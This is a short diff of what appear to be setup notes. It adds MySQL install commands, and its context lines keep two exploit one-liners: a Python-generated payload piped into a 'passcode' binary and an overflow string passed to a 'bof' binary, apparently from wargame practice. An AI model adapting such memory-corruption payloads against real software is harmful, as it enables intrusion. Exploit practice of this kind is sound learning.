@@ -8,6 +8,12 @@ sudo apt-get install libglib2.0-dev
 
 apt-get install libglib2.0-dev zlib1g-dev
 
+sudo apt-get install mysql-server
+
+sudo apt-get install mysql-client
+
+sudo apt-get install libmysqlclient-dev
+
 $ python -c "print('a'*96+'\x00\xa0\x04\x08'+'\n'+'134514147\n')" | ./passcode
 
 $ ./bof $(python -c 'print "A" * 30')
